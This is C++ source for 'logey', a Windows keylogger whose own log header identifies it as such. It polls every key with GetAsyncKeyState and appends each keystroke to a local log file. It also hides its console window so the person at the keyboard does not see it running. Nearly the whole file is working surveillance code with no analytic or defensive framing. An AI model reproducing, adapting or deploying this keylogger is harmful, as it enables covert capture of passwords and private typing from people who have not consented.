#include "logey.h" // Include all necessary functions for logey

int main() {
	if (!DEBUG) hideConsole();

	std::string filename = "logey.log"; // The name of the log file

	createFileHeader(filename);
	createTimeStamp(filename);

	while (true) {
		for (int key = 8; key < 256; key++) {
			if (GetAsyncKeyState(key) == -32767) { // Check the state of a key
				captureKey(key, filename); // Capture this key
			}
		}
		Sleep(10); // Sleep for 10 milliseconds to reduce CPU usage
	}

	return 0;
}


void captureKey(int key, std::string filename) {
	std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode
	std::string description; // An empty string that will hold the description of the pressed key

	switch (key) {
	case VK_RETURN:
		description = "\n";
		break;
	case VK_SHIFT:
		description = "{SHIFT}";
		break;
	case VK_SPACE:
		description = " ";
		break;
	case VK_BACK:
		description = "{BACKSPACE}";
		break;
	case VK_CONTROL:
		description = "{CTRL}";
		break;
	case VK_TAB:
		description = "{TAB}";
		break;
	case VK_ESCAPE:
		description = "{ESC}";
		break;
	case VK_MENU:
		description = "{ALT}";
		break;
	case VK_DELETE:
		description = "{DEL}";
		break;
	case 190:
		description = ".";
		break;
	case 188:
		description = ",";
		break;
	default:
		char c = '\0';
		if (key >= 33 && key <= 126) {
			c = (char)key;
			description = c;
		}
		else {
			description = "{" + std::to_string(key) + "}";
		}
		break;
	}

	if (DEBUG) std::clog << description; // Write text to console while debugging

	file << description; // Write text to log file
	file.close(); // Close the log file as soon as possible
}

void hideConsole() {
	HWND hideConsole;
	AllocConsole();
	hideConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hideConsole, 0);
}


void createFileHeader(std::string filename) {
	if (!fileExists(filename)) {
		std::ofstream file(filename, std::ios_base::app);
		file << "--------------------------------" << std::endl;
		file << "logey -- A keylogger for Windows" << std::endl;
		file << "author: exler" << std::endl;
		file << "license: MIT" << std::endl;
		file << "source: https://github.com/exler/logey" << std::endl;
		file << "--------------------------------" << std::endl;
		file.close(); // Close the log file as soon as possible
	}
}

void createTimeStamp(std::string filename) {
	std::ofstream file(filename, std::ios_base::app); // Open a log file in append mode

	char str[26];
	auto time = std::chrono::system_clock::now();
	std::time_t timestamp = std::chrono::system_clock::to_time_t(time);
	ctime_s(str, sizeof(str), &timestamp);

	file << "\n--------------------------------" << std::endl;
	file << "Session timestamp: " << str;
	file << "--------------------------------" << std::endl;

	file.close(); // Close the log file as soon as possible
}

bool fileExists(std::string filename) {
	if (std::ifstream(filename)) {
		return true;
	}
	else {
		return false;
	}
}